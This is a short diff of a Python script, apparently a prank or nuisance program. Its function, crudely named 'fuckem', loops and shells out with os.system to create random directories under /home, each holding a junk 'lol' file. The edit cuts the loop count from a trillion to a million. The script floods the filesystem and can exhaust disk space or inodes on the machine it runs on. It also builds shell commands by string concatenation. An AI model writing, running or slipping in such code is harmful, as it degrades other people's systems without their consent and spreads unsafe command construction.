@@ -14,7 +14,7 @@ def randomstring():
     return output
 
 def fuckem():
-    for i in range(1000000000000):  # @UnusedVariable
+    for i in range(1000000):  # @UnusedVariable
         directory = randomstring()
         os.system("mkdir /home/"  + directory)
         os.system("touch /home/" + directory + "/lol")
